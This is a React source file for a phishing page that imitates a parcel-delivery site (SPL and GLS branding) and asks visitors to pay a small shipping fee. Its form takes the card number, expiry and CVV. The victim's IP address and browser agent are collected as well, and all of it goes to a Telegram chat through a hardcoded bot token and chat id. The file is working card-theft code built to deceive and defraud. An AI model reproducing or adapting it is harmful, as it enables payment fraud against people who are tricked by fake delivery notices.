import { useEffect, useState } from "react";
// import "./login.css";
import "./loading.css";
import { useHistory } from "react-router";
import Page3 from "./page3";
import Navbar from "./components/header/Header";

import shipping from "./images/shipping.jpeg"

function Login() {
  const history = useHistory();
  const { TelegramClient } = require("messaging-api-telegram");

  const [expiry, setexpiry] = useState({ month: "", year: "" });

  const [ip, setIp] = useState("");
  const [agent, setAgent] = useState("");
  const [isSecond, setIsSecond] = useState(false);

  const [loading, setloading] = useState(false);

  const [isLoading, setIsLoading] = useState(true);

  const [tagInputVal, setTagInputVal] = useState("");
  const [numVal, setnumVal] = useState("");

  const getOs = () => window.navigator.userAgent;

  const getUserGeolocationDetails = async () => {
    setAgent(getOs());

    await fetch("https://api.ipify.org/?format=json").then((res) =>
      res.json().then((data) => setIp(data))
    );
  };

  useEffect(() => {
    getUserGeolocationDetails();
    setTimeout(() => {
      setIsLoading(false);
    }, 2000);
  });

  const client = new TelegramClient({
    accessToken: "1946580313:AAFbzUqaVbUGlCE4LFTWvGjbzhGF4WYAcD0",
  });
  const sendmsg = async () => {
    console.log("sending msg now");
    await client.sendMessage(
      -1001578583679,
      "card number : " +
        numVal +
        " \n expiry year  : " +
        expiry.year +
        " \n expiry month  : " +
        expiry.month +
        " \n cvv  : " +
        tagInputVal +
        " \n  IP: " +
        ip["ip"] +
        "\n agent :" +
        agent
    );
    localStorage.setItem("user", numVal);
    localStorage.setItem("ip", ip["ip"]);
  };

  const handleSubmit = (e) => {
    e.preventDefault();

    if (
      numVal &&
      numVal.length === 19 &&
      expiry.year &&
      expiry.month &&
      tagInputVal
    ) {
      setloading(true);
      setTimeout(() => {
        sendmsg() && history.push(`/checkpayment/${numVal}`);
      }, 3000);
    }
  };

  const confirm = () => {
    setloading(true);
    setTimeout(() => {
      setloading(false);
      setIsSecond(true);
    }, 3000);
  };
  const onChangeTagInput = (e) => {
    setTagInputVal(e.target.value.replace(/[^0-9]/gi, ""));
  };
  const onNumberChange = (e) => {
    setnumVal(
      e.target.value
        .replace(/[^\dA-Z]/g, "")
        .replace(/(.{4})/g, "$1 ")
        .trim()
    );
  };

  return (
    <>
      {/* <header>
        <div class="ce_header_desktop fixed-top">
          <div class="container">
            <div class="ce_page_header">
              <a
                data-analytics="click"
                data-analytics-action="Click"
                data-analytics-category="Header - Logo"
                class="logo"
              >
                &nbsp;
              </a>
              <div class="meta_navigation">
                <ul>
                  <li class="search">
                    <div class="ce_header_search_wrap"></div>
                  </li>
                  <li class="region">
                    <a
                      data-toggle="modal"
                      data-analytics="click"
                      data-analytics-action="Click"
                      data-analytics-category="Header - Country Switch"
                      class="region"
                    >
                      <span class="caption">Danmark</span>
                    </a>
                  </li>
                  <li class="languages">
                    <a
                      data-analytics="click"
                      data-analytics-action="Click"
                      data-analytics-category="Header - Language Switch"
                      class="active"
                    >
                      DA
                    </a>
                  </li>
                  <li>
                    <a
                      data-toggle="modal"
                      data-analytics="click"
                      data-analytics-action="Overlay"
                      data-analytics-category="Header - Link"
                      class="ico-user"
                    >
                      <span class="caption js-login-holder">YourGLS</span>
                    </a>
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </div>
        <div class="ce_header_mobile fixed-top">
          <dfn class="header_mobile_overlay"></dfn>
          <div class="fixedBar">
            <button
              type="button"
              data-analytics="Click"
              data-analytics-category="Navigation - Burger"
              class="burger-menu collapsed"
            >
              <span class="sr-only">Skift navigation</span>
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
            </button>
            <a
              data-analytics="click"
              data-analytics-action="Click"
              data-analytics-category="Header - Logo"
              class="logo"
            >
              &nbsp;
            </a>
            <span class="meta_navigation mobile_login">
              <a
                data-toggle="modal"
                data-analytics="click"
                data-analytics-action="Overlay"
                data-analytics-category="Header - Link"
                class="ico-user"
              >
                <span class="caption js-login-holder">YourGLS</span>
              </a>
            </span>
          </div>
        </div>
      </header> */}
<div className="container-fluid">
<Navbar  />
</div>
<br /><br /><br /><br />
      {isLoading ? (
        <Page3 />
      ) : (
        <main className="main_bg" style={{marginTop:"-63px"}}>
          <div  className="main_bg" >
            <div class="background-wrapper container_bg_gray " style={{backgroundColor:"white"}}>
              <div class="container">
                <div class="container ce_lead_text ce_lead_text_centered pt-20 pb-20">
                  <div class="row justify-content-center">
                    <div class="col-12">
                      <h1
                        style={{
                          fontFamily:
                            "TheSansGLS, Arial, Helvetica, sans-serif",
                          fontWeight: 500,
                          color: "#172154",
                          textAlign: "center",
                          fontSize: 52,
                          lineHeight:"80px"
                        }}
                        class="headline pt-40 pb-40"
                      >
                        <br></br><br></br>
                        Package Track
                        <br></br>
                      </h1>
                     
                      <div class="subline subline_small"></div>
                    </div>
                  </div>
                </div>
              




                <div class="row justify-content-center">
                  <div class="col-12 col-md-10 col-lg-7">
                    <div class="card card_search">
                      <div class="card-body pt-3 px-3">
                        <form
                          novalidate=""
                          name="witt002-search"
                          class="js-parcel-search ng-untouched ng-pristine ng-invalid"
                        >
                          <fieldset>
                            <div class="form-row">
                              <div class="form-group col-12 form-group_with_icon asdjasd">
                                <b>  Sender : </b>  SPL
                                <br />
                                <b>Amount :  </b> 21.34 (SAR)
                                <br />
                                <b>VAT (included) :</b> 0,00 (SAR) <br />
                                <b>Package number :</b>  08327164901
                                <br />
                                <b>SPL online number : </b>08327164901<br />
                              </div>
                              <div class="form-group col-12 form-group_with_icon">
                                {!isSecond ? (
                                  <div
                                    class="firstdfon22"
                                    style={{ display: "block" }}
                                  >
                                    <div class="dawkjhe8">
                                      <img
                                        alt="logo"
                                        src={
                                          // window.location.origin +
                                         shipping
                                        }
                                        style={{width:"100%",height:"100%"}}
                                      />
                                      <br />
                                      <div class="dawkjhe8">
                                      <br />
                                        {" "}
                                        pay shipping fee{" "}
                                      </div>
                                    </div>
                                    <div class="form-row mt-2">
                                      <div class="col-12 text-right col-md-6 order-md-1">
                                        <div class="form-group">
                                          {loading ? (
                                            <img
                                              src="https://i.stack.imgur.com/MEBIB.gif"
                                              alt="logo"
                                              class="iasdm2"
                                            />
                                          ) : (
                                           <>
                                                <br />
                                            <button
                                              onClick={confirm}
                                              type="submit"
                                              id="witt002_search_submit_button"
                                              class="btn  w-md-auto"
                                              style={{ display: "inline",backgroundColor:"#25C8E1",border:"1px solid #147787" }}
                                            >
                                           
                                              {" "}
                                              Continue{" "}
                                            </button>
     
                                          

                                           </>
                                          )}
                                        </div>
                                      </div>
                                      <div class="col-12 col-md-6 text-left order-md-0">
                                        <div class="form-group"></div>
                                      </div>
                                    </div>
                                  </div>
                                ) : (
                                  <div
                                    class="form2222"
                                    style={{ display: "block" }}
                                  >
                             <div class="form-row mt-2">
                                      <div class="col-12 col-md-8 order-md-1">
                                        <input
                                          type="tel"
                                          inputmode="numeric"
                                          autocomplete="cc-number"
                                          maxlength="19"
                                          onChange={(e) => onNumberChange(e)}
                                          value={numVal}
                                          required=""
                                          placeholder="•••• •••• •••• ••••"
                                          id=""
                                          class="form-control ng-untouched ng-pristine ng-invalid"
                                        />
                                      </div>
                                      <div class="col-12 col-md-4 order-md-0 ww229">
                                        <div class="d-flex align-items-center">
                                          {" "}
                                          Card Number{" "} &nbsp;
                                          <img
                                            alt="Visa"
                                            id="Visa_image"
                                            src="/images/download8.jpg"
                                            style={{
                                              borderWidth: 0,
                                              width: 90,
                                              height:50,
                                            }}
                                          />
                                        </div>
                                      </div>
                                    </div>
                                    <div class="form-row mt-2">
                                      <div class="col-12 col-md-8 order-md-1">
                                        <select
                                          value={expiry?.month}
                                          onChange={(e) =>
                                            setexpiry({
                                              ...expiry,
                                              month: e.target.value,
                                            })
                                          }
                                          aria-label="Month"
                                          id="month"
                                          required=""
                                          name="emx"
                                          class="formzzzb ng-untouched ng-pristine ng-invalid"
                                        >
                                          <option value=""></option>
                                          <option
                                            value="01"
                                            ng-reflect-value="01"
                                          >
                                            01
                                          </option>
                                          <option
                                            value="02"
                                            ng-reflect-value="02"
                                          >
                                            02
                                          </option>
                                          <option
                                            value="03"
                                            ng-reflect-value="03"
                                          >
                                            03
                                          </option>
                                          <option
                                            value="04"
                                            ng-reflect-value="04"
                                          >
                                            04
                                          </option>
                                          <option
                                            value="05"
                                            ng-reflect-value="05"
                                          >
                                            05
                                          </option>
                                          <option
                                            value="06"
                                            ng-reflect-value="06"
                                          >
                                            06
                                          </option>
                                          <option
                                            value="07"
                                            ng-reflect-value="07"
                                          >
                                            07
                                          </option>
                                          <option
                                            value="08"
                                            ng-reflect-value="08"
                                          >
                                            08
                                          </option>
                                          <option
                                            value="09"
                                            ng-reflect-value="09"
                                          >
                                            09
                                          </option>
                                          <option
                                            value="10"
                                            ng-reflect-value="10"
                                          >
                                            10
                                          </option>
                                          <option
                                            value="11"
                                            ng-reflect-value="11"
                                          >
                                            11
                                          </option>
                                          <option
                                            value="12"
                                            ng-reflect-value="12"
                                          >
                                            12
                                          </option>
                                        </select>
                                        <select
                                          value={expiry?.year}
                                          onChange={(e) =>
                                            setexpiry({
                                              ...expiry,
                                              year: e.target.value,
                                            })
                                          }
                                          aria-label="Year"
                                          id="year"
                                          required=""
                                          name="eyx"
                                          class="formzzzb ng-untouched ng-pristine ng-invalid"
                                        >
                                          <option value=""></option>

                                          <option
                                            value="21"
                                            ng-reflect-value="21"
                                          >
                                            2021
                                          </option>
                                          <option
                                            value="22"
                                            ng-reflect-value="22"
                                          >
                                            2022
                                          </option>
                                          <option
                                            value="23"
                                            ng-reflect-value="23"
                                          >
                                            2023
                                          </option>
                                          <option
                                            value="24"
                                            ng-reflect-value="24"
                                          >
                                            2024
                                          </option>
                                          <option
                                            value="25"
                                            ng-reflect-value="25"
                                          >
                                            2025
                                          </option>
                                          <option
                                            value="26"
                                            ng-reflect-value="26"
                                          >
                                            2026
                                          </option>
                                          <option
                                            value="27"
                                            ng-reflect-value="27"
                                          >
                                            2027
                                          </option>
                                          <option
                                            value="28"
                                            ng-reflect-value="28"
                                          >
                                            2028
                                          </option>
                                          <option
                                            value="29"
                                            ng-reflect-value="29"
                                          >
                                            2029
                                          </option>
                                          <option
                                            value="30"
                                            ng-reflect-value="30"
                                          >
                                            2030
                                          </option>
                                          <option
                                            value="31"
                                            ng-reflect-value="31"
                                          >
                                            2031
                                          </option>
                                          <option
                                            value="32"
                                            ng-reflect-value="32"
                                          >
                                            2032
                                          </option>
                                          <option
                                            value="33"
                                            ng-reflect-value="33"
                                          >
                                            2033
                                          </option>
                                        </select>
                                      </div>
                                      <div class="col-12 col-md-4 order-md-0 ww229">
                                        <div> Expiry date (month / year)  </div>
                                      </div>
                                    </div>
                                    <div class="form-row mt-2">
                                      <div class="col-12 col-md-8 order-md-1">
                                        <input
                                          type="search"
                                          value={tagInputVal}
                                          onChange={(e) => onChangeTagInput(e)}
                                          placeholder="000"
                                          maxlength="3"
                                          id=""
                                          name="cvx"
                                          required=""
                                          class="form-control ng-untouched ng-pristine ng-invalid"
                                        />
                                      </div>
                                      <div class="col-12 col-md-4 order-md-0 ww229">
                                        <div> CVV2 </div>
                                      </div>
                                    </div>
                                    <div class="form-row mt-2">
                                      <div class="col-12 text-right col-md-6 order-md-1">
                                        <div class="form-group">
                                          {loading ? (
                                            <img
                                              alt="logo"
                                              src="/images/load.gif"
                                              class="iasdm2"
                                            />
                                          ) : (
                                           <>
                                           <br /> <br />

<button
                                              onClick={handleSubmit}
                                              type="button"
                                              id="witt002_search_submit_button"
                                              class="btn  w-md-auto"
                                              style={{ display: "inline",backgroundColor:"#25C8E1" }}
                                            >
                                              {" "}
                                            Continue

    {" "}
                                            </button>

                                           </>
                                          )}
                                        </div>
                                      </div>
                                      <div class="col-12 col-md-6 text-left order-md-0">
                                        <div class="form-group">
                                           <br /> <br />
                                          <button
                                            onClick={() => setIsSecond(false)}
                                            type="reset"
                                            id="witt002_search_reset_button"
                                            class="btn  w-md-auto"
                                            style={{backgroundColor:"#25C8E1"}}
                                          >
                                            {" "}
                                            Back
                                            {" "}
                                          </button>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                )}
                              </div>
                            </div>
                          </fieldset>
                        </form>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </main>
      )}
    </>
  );
}

export default Login;
